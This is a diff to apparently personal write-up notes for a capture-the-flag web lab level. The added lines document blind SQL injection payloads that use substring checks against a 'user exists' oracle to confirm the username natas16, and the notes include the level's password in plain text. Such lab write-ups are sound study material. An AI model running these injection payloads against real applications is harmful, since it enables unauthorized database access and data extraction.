@@ -15,6 +15,16 @@ Password: SdqIqBsFcz3yotlNYErZSZwblkm0lrvx
    - If `username` is included in the request, connect to the database, and `SELECT` all from table users where the username = user input
    - If the debug key exists on the request, show the query to the user
    - If the number of rows is greater than 0, say that the user exists
-   - No place where the selected rows will be displayed to the user
-
+   - No place where the selected rows will be displayed to the user, only "This user exists." or "This user doesn’t exist."
+ - Username `natas16` should be in the database:
+   - Query (Checks to see if the substring of username starting at the first character and extending one character in length is equal to n or select all from users where the username is an empty string, or where the first character equals n):
+    ```sql
+    " OR substring(username,1,1) = 'n' #
+    "SELECT * from users where username="" OR substring(username,1,1) = 'n' #
+    ```
+    - Result: This user exists.
+  - Other queries:
+  ```sql
+  " OR substring(username,1,7) = 'natas16' # -> Result: This user exists.
+  ```
 - Password: `SdqIqBsFcz3yotlNYErZSZwblkm0lrvx`
